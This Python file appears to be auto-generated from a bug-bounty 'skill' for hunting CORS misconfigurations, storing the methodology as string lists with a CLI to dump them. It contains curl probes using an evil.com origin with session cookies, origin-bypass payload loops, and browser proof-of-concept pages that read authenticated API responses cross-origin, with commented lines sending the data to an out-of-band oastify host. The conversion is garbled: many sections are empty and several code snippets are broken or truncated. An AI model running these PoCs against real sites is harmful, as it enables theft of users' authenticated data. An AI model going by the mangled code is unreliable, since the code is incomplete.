#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-cors

Skill: HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration
Desc : Hunt CORS Misconfiguration — origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers.

Run:  python claude-bughunter-hunt-cors.py --help
      python claude-bughunter-hunt-cors.py --list
      python claude-bughunter-hunt-cors.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-cors'
TITLE = 'HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration'
DESCRIPTION = 'Hunt CORS Misconfiguration — origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers.'

PAYLOADS = {
    'main': ["name: hunt-cors", "description: \"Hunt CORS Misconfiguration \u2014 origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers.\"", "sources: hackerone_public"],
    'hunt-cors-cross-origin-resource-sharing-misconfiguration': [],
    'what-actually-pays-and-what-does-not': ["CORS pays High **only** when an attacker-controlled origin can perform a", "**credentialed** cross-origin read of sensitive authenticated data, and you", "have a browser PoC proving the response body is readable from `evil.com`.", "Two hard browser rules that kill most \"findings\" \u2014 check these FIRST:", "- **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**", "If the server returns `ACAO: *`, the browser refuses to send/expose the", "response for a `credentials: include` request. A wildcard-only endpoint is", "**not** credential-exploitable. It is only interesting if the data it serves", "is sensitive *without* a session (rare) \u2014 usually this is Informational/Low.", "- **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It", "matters only if `ACAO` reflects/allows your specific attacker origin AND a", "cross-origin credentialed `fetch` actually returns a readable body. ACAC on a", "response that does not reflect your origin proves nothing.", "If you cannot demonstrate a readable cross-origin authed body in a real", "browser, you do not have a High. Do not submit header-diffing alone."],
    'crown-jewel-targets': ["- **Reflect-any-origin + credentials** \u2014 server echoes the `Origin` header AND", "sets `ACAC: true` \u2192 any site reads authed API responses. The classic High.", "- **Null-origin trust** \u2014 `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a", "`data:`/redirect chain) emits `Origin: null`, so any page can read authed data.", "- **Subdomain-regex bypass** \u2014 trusted-origin regex with a parsing flaw. The", "correct payload depends on *which* flaw (see Phase 3 \u2014 this is where most", "skills get it wrong).", "- **Subdomain takeover \u2192 trusted origin** \u2014 a dangling subdomain that the CORS", "policy trusts; take it over, host the PoC there (see hunt-subdomain).", "- **postMessage missing/loose origin check** \u2014 handler that processes", "`event.data` without strictly validating `event.origin`."],
    'attack-surface-signals': ["Any endpoint returning an Access-Control-Allow-Origin header", "API endpoints:   /api/*, /v1/*, /graphql", "Profile/account: /api/me, /api/profile, /api/user, /api/session", "Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings", "Financial:       /api/balance, /api/transactions", "Admin/internal:  /api/admin/*, /api/internal/*", "Prioritize endpoints that (a) require a session cookie and (b) return PII,", "tokens, CSRF tokens, or other secrets in the body."],
    'step-by-step-hunting-methodology': [],
    'phase-1-discover-cors-endpoints': ["```bash"],
    'probe-api-endpoints-use-get-not-i-some-servers-only-emit-cors-on-get': [],
    'and-i-sends-head-which-may-be-handled-differently': ["while read url; do", "result=$(curl -s -D - -o /dev/null \"$url\" \\", "-H \"Origin: https://evil.com\" \\", "-H \"Cookie: $SESSION_COOKIE\" | grep -i \"access-control\")", "[ -n \"$result\" ] && echo \"=== $url ===\" && echo \"$result\"", "done < recon/$TARGET/api-endpoints.txt"],
    'httpx-bulk-check': ["cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \\", "httpx -H \"Origin: https://evil.com\" -match-string \"access-control-allow-origin\""],
    'phase-2-reflect-any-origin-null-origin': ["```bash"],
    'does-the-server-reflect-an-arbitrary-origin-back': ["curl -s -D - -o /dev/null https://$TARGET/api/me \\", "-H \"Origin: https://evil.com\" \\", "-H \"Cookie: $SESSION_COOKIE\" | grep -i \"access-control\""],
    'vulnerable-the-high-case': [],
    'access-control-allow-origin-https-evil-com-reflects-attacker-origin': [],
    'access-control-allow-credentials-true-credentials-readable': [],
    'not-exploitable-for-credentialed-theft': [],
    'access-control-allow-origin-browser-blocks-creds-read': [],
    'no-acac-or-acac-absent-not-credentialed': [],
    'null-origin-trust': ["curl -s -D - -o /dev/null https://$TARGET/api/me \\", "-H \"Origin: null\" \\", "-H \"Cookie: $SESSION_COOKIE\" | grep -i \"access-control\""],
    'looking-for-access-control-allow-origin-null-acac-true': [],
    'phase-3-subdomain-trusted-origin-regex-bypass': ["The right payload depends on **which** regex flaw the server has. Identify the", "class first, then send the matching payload. Getting this wrong wastes the test", "and produces false negatives.", "```bash"],
    'send-each-class-specific-payload-and-watch-what-the-server-reflects': ["for ORIGIN in \\", "\"https://evil.target.com\" \\", "\"https://eviltarget.com\" \\", "\"https://x.target.com.evil.com\" \\", "\"https://target.com.evil.com\" \\", "\"https://target.com%60.evil.com\" \\", "\"http://target.com\"; do", "RESULT=$(curl -s -D - -o /dev/null \"https://$TARGET/api/me\" \\", "-H \"Origin: $ORIGIN\" \\", "-H \"Cookie: $SESSION_COOKIE\" | grep -i \"access-control\")", "echo \"[$ORIGIN] -> ${RESULT:-no CORS}\"", "A bypass is real only if the server reflects **your registerable origin** into", "`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless", "you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomain)."],
    'phase-4-pre-flight-options-gating-bypass': ["Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple", "`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. The browser only sends", "the real request if the pre-flight response authorizes the method/header. Two", "things to test:", "1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**", "If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect", "whatever you ask for, a malicious origin can drive state-changing requests", "(chain to CSRF-style writes that JSON/SameSite would otherwise block).", "```bash", "curl -s -D - -o /dev/null -X OPTIONS \"https://$TARGET/api/account/email\" \\", "-H \"Origin: https://evil.com\" \\", "-H \"Access-Control-Request-Method: PUT\" \\", "-H \"Access-Control-Request-Headers: x-custom-auth, content-type\" \\"],
    'vulnerable-acao-reflects-evil-com-acac-true': [],
    'access-control-allow-methods-put-access-control-allow-headers-x-custom-auth': [],
    'attacker-origin-can-issue-authed-put-delete-with-custom-headers': ["2. **Is the pre-flight even enforced server-side?** Some servers reflect the", "origin on `OPTIONS` but the actual GET/POST also reflects \u2014 the read path is", "the bug; the pre-flight just confirms write-path reach. Test the GET/POST", "directly too \u2014 never assume the pre-flight result equals the real-request", "result. Confirm in a browser, because curl ignores CORS entirely."],
    'phase-5-browser-pocs-the-only-thing-that-proves-impact': ["curl does NOT enforce CORS \u2014 it will happily show you a reflected header even", "when a browser would block the read. **Every CORS High needs a browser PoC.**", "**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):", "```html", "<!doctype html><body><pre id=\"out\"></pre>", "<script>", "fetch(\"https://TARGET/api/me\", {credentials: \"include\"})", ".then(r => r.text())", ".then(d => {", "document.getElementById(\"out\").innerText = d;        // prove readable body", "// OOB proof: fetch(\"https://OOB-ID.oastify.com/?d=\"+encodeURIComponent(d));", ".catch(e => document.getElementById(\"out\").innerText = \"BLOCKED: \" + e);", "</script></body>", "If you see `BLOCKED` / a TypeError, the browser refused the read \u2014 it is NOT a", "valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).", "**5b. Null-origin read** \u2014 a `sandbox` iframe sends `Origin: null`. The inner", "document must lack `allow-same-origin` so its origin is opaque (`null`):", "```html", "<!doctype html><body>", "<!-- Outer page hosted anywhere -->", "<iframe sandbox=\"allow-scripts\" srcdoc='", "<script>", "fetch(\"https://TARGET/api/me\", {credentials: \"include\"})", ".then(r => r.text())", ".then(d => parent.postMessage(d, \"*\"));", "&lt;/script&gt;'></iframe>", "<script>", "window.addEventListener(\"message\", e => {", "// d is the authed body, read cross-origin via a null Origin", "// fetch(\"https://OOB-ID.oastify.com/?d=\"+encodeURIComponent(e.data));", "console.log(\"NULL-ORIGIN READ:\", e.data);", "</script></body>", "(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the", "request through a 302 redirect chain whose final hop is cross-scheme.)", "**5c. Trusted-subdomain read** \u2014 once you control a host that the regex trusts", "(real subdomain via takeover, or a registerable origin that matches a buggy", "regex from Phase 3), host **5a** there. The reflected origin is now an origin", "you legitimately serve, so the browser allows the read."],
    'phase-6-postmessage-origin-check': ["```bash"],
    'find-message-handlers-that-don-t-strictly-validate-event-origin': ["grep -rEn \"addEventListener\\(['\\\"]message\" recon/$TARGET/ --include=\"*.js\" \\"],
    'then-audit-each-hit-does-it-check-event-origin-against-an-allowlist': [],
    'before-using-event-data-weak-checks-to-flag': [],
    'indexof-target-com-1-target-com-evil-com-passes': [],
    'endswith-target-com-eviltarget-com-passes': [],
    'startswith-https-target-https-target-evil-com-passes': [],
    'no-check-at-all': ["postMessage is a separate class from HTTP CORS \u2014 impact is DOM-side (XSS,", "client-side auth bypass). See hunt-dom for exploitation depth."],
    'automation-triage-only-never-the-proof': ["```bash"],
    'corsy-fast-reflection-null-pre-domain-checks': ["pip3 install corsy", "corsy -u https://$TARGET -t 10 --headers \"Cookie: $SESSION_COOKIE\""],
    'nuclei-cors-templates': ["nuclei -u https://$TARGET -t http/misconfiguration/cors/"],
    'burp-passively-flags-origin-reflection-always-re-confirm-in-a-real-browser': ["Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser."],
    'chain-table': [],
    'validation-discipline-read-before-submitting': ["- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.", "Show a screenshot/console log of the authed body read from `evil.com`. If the", "fetch throws / logs `BLOCKED`, you have nothing.", "- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue", "wildcard if the data is sensitive unauthenticated (then it is usually Low).", "- **`ACAC: true` alone proves nothing** \u2014 it must pair with your reflected", "origin AND a successful readable cross-origin body.", "- **Match the regex class to the payload (Phase 3).** Do not submit", "`target.com.evil.com` against an end-anchored escaped-dot regex \u2014 it does not", "match and is not a bug.", "- **`evil.target.com` reflecting is not automatically a bug** \u2014 it is an", "in-scope subdomain by design unless you can actually control it.", "- **OOB confirmation** for blind/headless contexts: exfil the read body to a", "Burp Collaborator / oastify host and show the interaction. Use a unique", "per-test marker so the hit is unambiguously yours.", "- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the", "read to PII, tokens, secrets, or financial data to justify severity.", "**Severity:**", "- Reflects attacker origin + creds + sensitive body, browser-proven: High", "- Pre-flight authorizes attacker-origin state change on sensitive action: High", "- Null-origin + sensitive authed body, browser-proven: Medium\u2013High", "- Subdomain-takeover/XSS-assisted credentialed read: High/Critical", "- Reflects origin, no credentials / non-sensitive: Low\u2013Informational", "- `ACAO: *` only (no creds possible): Informational unless data is secret"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()